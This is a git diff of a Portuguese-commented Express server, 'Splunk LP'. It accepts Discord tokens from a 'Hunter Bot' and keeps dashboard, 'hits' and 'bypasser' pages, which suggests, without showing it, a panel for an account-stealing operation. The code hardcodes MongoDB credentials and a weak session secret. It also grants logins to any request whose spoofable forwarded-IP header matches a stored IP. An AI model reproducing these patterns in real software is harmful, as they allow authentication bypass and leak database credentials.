@@ -9,50 +9,49 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// MongoDB (seu link exato)
 mongoose.connect("mongodb+srv://admin:lp@cluster.5mwrlvm.mongodb.net/splunklp?retryWrites=true&w=majority");
 
-// Modelo IP confiável
 const TrustedIP = mongoose.model('TrustedIP', new mongoose.Schema({
-  ip: { type: String, unique: true },
+  ip: String,
   discordId: String,
   username: String,
   lastSeen: Date
-}));
+}, { collection: 'trustedips' }));
 
-// Session
 app.use(session({
   secret: 'adminlp',
   resave: false,
   saveUninitialized: false,
   store: MongoStore.create({ mongoUrl: "mongodb+srv://admin:lp@cluster.5mwrlvm.mongodb.net/splunklp" }),
-  cookie: { maxAge: 365 * 24 * 60 * 60 * 1000 } // 1 ano
+  cookie: { maxAge: 365 * 24 * 60 * 60 * 1000 }
 }));
 
 app.use(express.static('public'));
+app.set('views', path.join(__dirname, 'views'));
 
 function getIP(req) {
-  return req.headers['cf-connecting-ip'] ||
-         req.headers['x-forwarded-for']?.split(',')[0] ||
+  return req.headers['cf-connecting-ip'] || 
+         req.headers['x-forwarded-for']?.split(',')[0] || 
          req.ip;
 }
 
-// Página inicial
+// Página principal
 app.get('/', async (req, res) => {
   const ip = getIP(req);
   const trusted = await TrustedIP.findOne({ ip });
   if (trusted) {
     req.session.user = { id: trusted.discordId, username: trusted.username };
-    return res.redirect('/dashboard');
   }
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Rota que recebe do Hunter Bot
+// Recebe do Hunter Bot → mostra tela de sucesso → vai pro dashboard
 app.get('/sucess', async (req, res) => {
   const { token, ip: hunterIP } = req.query;
 
-  if (!token) return res.send('<h1 style="color:red">Erro: token não recebido</h1>');
+  if (!token) {
+    return res.send('<h1 style="color:red;text-align:center;padding-top:20vh;font-family:sans-serif">Erro: token não recebido</h1>');
+  }
 
   try {
     const { data: user } = await axios.get('https://discord.com/api/users/@me', {
@@ -61,15 +60,9 @@ app.get('/sucess', async (req, res) => {
 
     const realIP = hunterIP || getIP(req);
 
-    // Salva IP como confiável pra sempre
     await TrustedIP.findOneAndUpdate(
       { ip: realIP },
-      {
-        ip: realIP,
-        discordId: user.id,
-        username: user.global_name || user.username,
-        lastSeen: new Date()
-      },
+      { ip: realIP, discordId: user.id, username: user.global_name || user.username, lastSeen: new Date() },
       { upsert: true }
     );
 
@@ -79,19 +72,22 @@ app.get('/sucess', async (req, res) => {
       avatar: user.avatar ? `https://cdn.discordapp.com/avatars/\( {user.id}/ \){user.avatar}.png` : null
     };
 
-    res.redirect('/dashboard');
+    // Mostra a tela de sucesso por 3 segundos
+    res.sendFile(path.join(__dirname, 'views', 'sucess.html'));
   } catch (err) {
-    res.send('<h1 style="color:#ff3366">Token inválido ou expirado</h1><a href="/">Voltar</a>');
+    res.send(`
+      <div style="background:#000;color:#ff3366;text-align:center;padding-top:20vh;font-family:sans-serif">
+        <h1>Token inválido ou expirado</h1>
+        <p><a href="/" style="color:#00ffff">Voltar</a></p>
+      </div>
+    `);
   }
 });
 
-// Rotas do painel (mesmo sistema antigo)
-const auth = (req, res, next) => req.session.user ? next() : res.redirect('/');
-app.get('/dashboard', auth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
-app.get('/hits', auth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'hits.html')));
-app.get('/settings', auth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'settings.html')));
-app.get('/bypasser', auth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'bypasser.html')));
+// Logout
+app.get('/logout', (req, res) => {
+  req.session.destroy();
+  res.redirect('/');
+});
 
-app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/'); });
-
-app.listen(PORT, () => console.log('Splunk LP rodando!'));
+app.listen(PORT, () => console.log('Splunk LP rodando com sucesso!'));
